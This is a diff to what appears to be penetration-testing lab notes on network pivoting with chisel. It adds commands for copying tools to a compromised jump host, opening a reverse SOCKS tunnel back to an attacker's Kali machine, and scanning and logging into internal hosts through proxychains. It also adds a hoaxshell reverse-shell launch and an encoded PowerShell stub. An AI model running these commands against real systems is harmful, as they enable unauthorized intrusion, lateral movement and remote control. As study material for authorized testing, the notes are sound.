@@ -6,6 +6,12 @@ https://www.youtube.com/@elevatecyber5031
 
 https://www.kali.org/tools/chisel/
 
+https://github.com/jpillora/chisel
+
+```
+ln -s /usr/local/bin/chisel chisel
+```
+
 ```
 chisel -h
 ```
@@ -49,4 +55,57 @@ proxychains nmap -sT -p 88 -Pn -n 192.168.237.103
 proxychains crackmapexec smb 192.168.237.103 -u 'guest' -p ''
 ```
 
+```
+https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
+```
 
+```
+scp nmap username@ip:/tmp
+```
+
+```
+scp chisel username@ip:/tmp
+```
+
+**In the attacker (kali) machine**
+
+```
+chisel server --socks5 --reverse
+```
+
+```
+chisel server --socks5 --reverse
+2023/09/15 22:05:53 server: Reverse tunnelling enabled
+2023/09/15 22:05:53 server: Fingerprint wq+g4n5Ac8sFp9t9GwOLu7U6arED88bF2jfhH4IxV70=
+2023/09/15 22:05:53 server: Listening on http://0.0.0.0:8080
+```
+
+**In the compromised pivot (jump host) machine**
+
+```
+./chisel client --fingerprint wq+g4n5Ac8sFp9t9GwOLu7U6arED88bF2jfhH4IxV70= [attacker's machine IP]:8080 R:8000:[other's machine IP]:80
+```
+
+```
+./chisel client --fingerprint wq+g4n5Ac8sFp9t9GwOLu7U6arED88bF2jfhH4IxV70= kaliIP:8080 0.0.0.0:9999:kaliIP:9999
+```
+
+**In the kali's web browser**
+
+http://localhost:8000
+
+```
+proxychains curl http://other's machine IP
+```
+
+```
+proxychains xfreerdp /v:ip /u:Administrator
+```
+
+```
+python hoaxshell.py -s other's machine IP -p 9999
+```
+
+```
+powershell -e
+```
